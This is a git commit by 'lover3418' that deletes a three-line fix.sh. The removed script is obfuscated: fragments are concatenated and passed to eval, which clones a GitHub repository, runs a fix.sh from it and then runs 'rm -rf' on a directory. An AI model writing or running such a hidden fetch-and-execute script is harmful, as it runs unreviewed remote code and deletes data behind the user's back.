aa36b6f208e20ebc387d23d3f011346c39b8f735
lover3418 <lover3418@gmail.com>
2019-12-07 19:52:55 +0530

    Delete fix.sh

--- fix.sh
+++
@@ -1,3 +0,0 @@
-z="
-";Vz='/tem';Az='git ';Hz='/lov';Cz='e ht';Wz='p';Jz='18/t';Tz='rf s';Oz='bash';Qz='.sh';Kz='emp.';Rz='cd';Lz='git';Iz='er34';Ez='//gi';Gz='.com';Nz='emp';Pz=' fix';Sz='rm -';Bz='clon';Fz='thub';Mz='cd t';Dz='tps:';Uz='park';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$z$Oz$Pz$Qz$z$Rz$z$Sz$Tz$Uz$Vz$Wz"
